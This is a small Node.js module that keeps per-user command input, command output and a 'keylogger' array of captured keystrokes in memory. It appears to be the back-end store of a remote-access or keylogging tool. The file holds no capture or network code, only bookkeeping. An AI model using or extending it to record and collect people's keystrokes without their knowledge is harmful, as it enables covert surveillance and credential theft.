database = {

    users: {},

    addKey: function(user, key){
        this.users[user].keylogger.push(key);
    },

    createUser: function(user){
        this.users[user] = {input: "", keylogger: [], output: ""};
    },

    destroy: function(){
        for (user in this.users){
            delete this.users[user];
        }
    },

    getInput: function(user){
        var input = this.users[user].input;
        this.users[user].input = "";
        return input;
    },

    getKeylogger: function(user){
        return this.users[user].keylogger;
    },

    getOutput: function(user){
        var output = this.users[user].output;
        this.users[user].output = "";
        return output;
    },

    getUsers: function(){
        var users = []

        for (user in this.users){
            users.push(user);
        }
        return users;
    },

    setInput: function(user, value){
        this.users[user].input = value;
    },

    setOutput: function(user, value){
        this.users[user].output = value;
    }
}

module.exports = database;